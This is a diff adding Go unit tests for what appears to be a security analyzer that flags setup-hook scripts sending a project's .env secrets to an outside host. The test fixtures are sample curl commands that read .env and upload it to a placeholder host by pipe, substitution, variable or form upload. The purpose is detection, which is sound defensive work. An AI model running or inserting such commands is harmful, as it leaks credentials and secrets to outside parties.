@@ -36,6 +36,74 @@ func TestRemoteContentExecutionFollowsSubstitutionAndVariableFlow(t *testing.T) 
 	}
 }
 
+func TestProjectSecretExfiltrationFlowVariants(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		content string
+	}{
+		{name: "pipeline", content: `cat .env | curl --data-binary @- https://example.invalid/upload`},
+		{name: "substitution", content: `curl -d "$(cat .env)" https://example.invalid/upload`},
+		{name: "variable", content: "payload=$(cat .env)\ncurl -d \"$payload\" https://example.invalid/upload"},
+		{name: "same operation", content: `curl -F file=@.env https://example.invalid/upload`},
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
+			got := findFinding(finding.AnalyzeSDK(item), "risk.project-secret-exfiltration")
+			if got == nil {
+				t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
+			}
+			if got.Severity != "critical" || len(got.Evidence) != 2 {
+				t.Fatalf("exfiltration finding = %#v", got)
+			}
+			if got.Evidence[0].ID != "project-sensitive-file-read" || got.Evidence[0].Value != ".env" ||
+				got.Evidence[1].ID != "external-send" || got.Evidence[1].FromOperationID == "" || got.Evidence[1].ToOperationID == "" {
+				t.Errorf("flow evidence = %#v", got.Evidence)
+			}
+		})
+	}
+}
+
+func TestProjectSecretExfiltrationRejectsDisconnectedAndUnavailableProject(t *testing.T) {
+	t.Parallel()
+
+	disconnected := analyzedSDK(t, "cat .env\ncurl -d public https://example.invalid/upload\n", sdk.HookSetupProject)
+	if got := findFinding(finding.AnalyzeSDK(disconnected), "risk.project-secret-exfiltration"); got != nil {
+		t.Fatalf("disconnected flow finding = %#v", got)
+	}
+
+	noProject := analyzedSDK(t, "cat /project/.env | curl --data-binary @- https://example.invalid/upload\n", sdk.HookSetupBase)
+	if got := findFinding(finding.AnalyzeSDK(noProject), "risk.project-secret-exfiltration"); got != nil {
+		t.Fatalf("unmounted project finding = %#v", got)
+	}
+}
+
+func TestCriticalExfiltrationSetsRiskFloorAndSourceSinkHighlights(t *testing.T) {
+	t.Parallel()
+
+	item := analyzedSDK(t, "curl -F file=@.env https://example.invalid/upload\n", sdk.HookSetupProject)
+	findings := finding.AnalyzeSDK(item)
+	assessment := finding.AssessSDK(item, findings)
+	if assessment.Risk.Score < 80 || assessment.Risk.Level != "critical" || assessment.ReviewPriority.Score < 80 {
+		t.Fatalf("assessment = %#v", assessment)
+	}
+	var highlight *finding.RiskHighlight
+	for index := range assessment.KeyRisks {
+		if assessment.KeyRisks[index].ID == "risk.project-secret-exfiltration" {
+			highlight = &assessment.KeyRisks[index]
+			break
+		}
+	}
+	if highlight == nil || len(highlight.Scopes) != 2 {
+		t.Fatalf("key risk highlight = %#v", highlight)
+	}
+	if highlight.Scopes[0].Value != ".env" || highlight.Scopes[1].Value != "file=@.env" {
+		t.Errorf("source/sink scopes = %#v", highlight.Scopes)
+	}
+}
+
 func TestLifecycleRiskAndAssuranceUseHookContext(t *testing.T) {
 	t.Parallel()
 	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
